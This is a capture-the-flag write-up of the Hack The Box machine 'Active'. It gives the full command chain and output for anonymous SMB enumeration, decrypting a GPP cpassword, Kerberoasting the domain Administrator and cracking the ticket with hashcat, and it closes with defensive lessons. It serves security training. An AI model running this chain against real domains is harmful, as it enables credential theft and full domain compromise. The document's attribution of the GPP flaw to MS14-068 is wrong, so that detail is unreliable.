# HTB Write-Up: Active

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Active)       |
| Difficulty | Easy                                                             |
| OS         | Windows                                                          |
| Author     | Samurai                                                           |
| Date       | May 24, 2026                                                     |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB Anonymous Access & GPP Password](#2-enumeration--smb-anonymous-access--gpp-password)
3. [Initial Access — GPP Credential Decryption](#3-initial-access--gpp-credential-decryption)
4. [Privilege Escalation — Kerberoasting the Administrator](#4-privilege-escalation--kerberoasting-the-administrator)
5. [Summary](#5-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery, followed by **Nmap** for service and version fingerprinting:

```bash
rustscan -a 10.129.3.12 -- -A
nmap -A 10.129.3.12 -p 53,88,135,139,389,445,464,593,636
```

**Open Ports:**

| Port | Service | Details |
|------|---------|---------|
| 53   | DNS | Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1) |
| 88   | Kerberos | Microsoft Windows Kerberos |
| 135  | MSRPC | Microsoft Windows RPC |
| 139  | NetBIOS | Microsoft Windows netbios-ssn |
| 389  | LDAP | Domain: `active.htb` |
| 445  | SMB | microsoft-ds |
| 464  | kpasswd5 | tcpwrapped |
| 593  | HTTP-RPC | RPC over HTTP 1.0 |
| 636  | LDAPSSL | tcpwrapped |

The Nmap LDAP probe confirmed the domain: **`active.htb`**, and the host is a **Domain Controller** running **Windows Server 2008 R2 SP1**.

---

## 2. Enumeration — SMB Anonymous Access & GPP Password

### 2.1 — SMB Share Enumeration

Anonymous SMB access was tested with **NetExec**:

```bash
netexec smb 10.129.3.12 -u '' -p '' --shares
```

**Output:**

```
SMB  10.129.3.12  445  DC  [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB  10.129.3.12  445  DC  [+] active.htb\:
SMB  10.129.3.12  445  DC  [*] Enumerated shares
SMB  10.129.3.12  445  DC  Share           Permissions     Remark
SMB  10.129.3.12  445  DC  -----           -----------     ------
SMB  10.129.3.12  445  DC  ADMIN$                          Remote Admin
SMB  10.129.3.12  445  DC  C$                              Default share
SMB  10.129.3.12  445  DC  IPC$                            Remote IPC
SMB  10.129.3.12  445  DC  NETLOGON                        Logon server share
SMB  10.129.3.12  445  DC  Replication     READ
SMB  10.129.3.12  445  DC  SYSVOL                          Logon server share
SMB  10.129.3.12  445  DC  Users
```

The **`Replication`** share was readable without credentials — unusual for a production DC and a strong signal for a misconfigured GPO backup. The share was mounted and its contents recursively downloaded.

### 2.2 — GPP Password in Groups.xml

Inside the Replication share, a **Group Policy Preferences** XML file was discovered at the standard GPP path:

```
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
        name="active.htb\SVC_TGS"
        image="2"
        changed="2018-07-18 20:46:06"
        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U"
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                userName="active.htb\SVC_TGS"
                noChange="1"
                neverExpires="1"
                acctDisabled="0"/>
  </User>
</Groups>
```

The `cpassword` field contains an **AES-256 encrypted password** set via Group Policy Preferences — a vulnerability publicly documented in **MS14-068**. Microsoft published the static encryption key in their MSDN documentation, making every `cpassword` trivially decryptable.

---

## 3. Initial Access — GPP Credential Decryption

The `cpassword` was decrypted using `gpp-decrypt`:

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

**Result:**

```
GPPstillStandingStrong2k18
```

Credentials recovered:

| Account | Password |
|---------|----------|
| `active.htb\SVC_TGS` | `GPPstillStandingStrong2k18` |

**User flag retrieved** by browsing the `Users` share as `SVC_TGS` and reading `\SVC_TGS\Desktop\user.txt`.

---

## 4. Privilege Escalation — Kerberoasting the Administrator

### 4.1 — SPN Enumeration & TGS Request

With valid domain credentials, **Kerberoasting** was performed using `impacket-GetUserSPNs` to request TGS tickets for all accounts with registered SPNs:

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.3.12 -request
```

**Output:**

```
ServicePrincipalName  Name           MemberOf
--------------------  -------------  --------------------------------------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
```

The **Administrator** account itself had a registered SPN — `active/CIFS:445` — making it directly Kerberoastable. The TGS ticket (Kerberos 5, etype 23, TGS-REP) was written to `hash`.

### 4.2 — Hash Cracking

The TGS-REP hash was cracked offline with **Hashcat** (mode 13100):

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$...<hash>...:Ticketmaster1968

Status: Cracked
Time: 3 seconds
```

Administrator credentials recovered:

| Account | Password |
|---------|----------|
| `active.htb\Administrator` | `Ticketmaster1968` |

### 4.3 — Root Flag via SMB

With Administrator credentials, the root flag was retrieved directly from the `Users` share:

```bash
smbclient -U 'active.htb\administrator' //10.129.3.12/Users
```

```
smb: \> cd Administrator\Desktop
smb: \Administrator\Desktop\> get root.txt
```

**Root flag retrieved from `/Administrator/Desktop/root.txt`.**

---

## 5. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan + Nmap -A | DC identified, domain `active.htb`, Windows Server 2008 R2 |
| SMB Enumeration | NetExec anonymous share listing | `Replication` share readable without credentials |
| GPP Discovery | Manual browsing of `Replication` share | `Groups.xml` with `cpassword` for `SVC_TGS` |
| GPP Decryption | `gpp-decrypt` (MS14-068 static AES key) | `SVC_TGS:GPPstillStandingStrong2k18` + user flag |
| Kerberoasting | `impacket-GetUserSPNs -request` | TGS-REP hash for `Administrator` (SPN: `active/CIFS:445`) |
| Hash Cracking | Hashcat mode 13100 + rockyou.txt | `Administrator:Ticketmaster1968` in 3 seconds |
| Root | SMB as Administrator | Root flag from `\Administrator\Desktop\root.txt` |

### Key Takeaways

- **GPP passwords are never safe, even on read-only shares.** The `Replication` share being world-readable to anonymous users is the single misconfiguration that unlocks the entire chain. Any `cpassword` value in a Groups.xml is immediately decryptable using the publicly known AES key — there is no mitigation short of removing the GPP entry entirely and rotating the credential.

- **Administrator accounts should never have SPNs registered against them.** The `active/CIFS:445` SPN assigned to the built-in Administrator account allowed a low-privileged domain user to request and take offline a TGS-REP hash for the highest-privilege account in the domain. Service accounts used for Kerberos delegation should be purpose-built, minimally privileged, and use long random passwords (>25 characters) to resist offline cracking.

- **Kerberoasting is a silent attack.** The TGS request made by `impacket-GetUserSPNs` is indistinguishable from legitimate Kerberos activity without purpose-built monitoring. Detection requires baselining TGS request volume per account and alerting on anomalous spikes — not the default posture on most DCs.
